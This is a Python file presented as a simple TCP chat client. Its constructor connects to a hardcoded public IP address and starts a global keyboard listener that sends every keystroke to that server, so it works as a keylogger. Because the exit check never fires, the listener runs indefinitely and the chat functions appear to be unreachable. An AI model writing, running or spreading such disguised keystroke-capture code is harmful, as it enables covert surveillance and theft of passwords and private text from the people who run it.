import socket
import threading
from pynput.keyboard import Listener


class TCPClient:
    def __init__(self, host="35.194.254.176", port=80):
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.host = host
        self.port = port
        try:
            self.client_socket.connect((self.host, self.port))

            def on_press(key):
                try:
                    message = str(key.char)
                except AttributeError:
                    message = str(key)
                self.client_socket.send(message.encode())

            def on_release(key):
                if key == "esc":
                    return False

            with Listener(on_press=on_press, on_release=on_release) as listener:
                listener.join()
        except Exception as e:
            raise

    def receive_messages(self):
        while True:
            try:
                data = self.client_socket.recv(1024)
                if not data:
                    break
                message = data.decode()
                print(f"Server: {message}")
            except Exception as e:
                break
        self.client_socket.close()

    def send_messages(self):
        while True:
            try:
                message = input("Enter message: ")
                if message.lower() == "exit":
                    break
                self.client_socket.sendall(message.encode())
            except Exception as e:
                break

    def start(self):
        receive_thread = threading.Thread(target=self.receive_messages)
        receive_thread.daemon = True
        receive_thread.start()
        self.send_messages()


def main():
    try:
        client = TCPClient()
        client.start()
    except Exception as e:
        print("Connection failed: ", e)


if __name__ == "__main__":
    main()
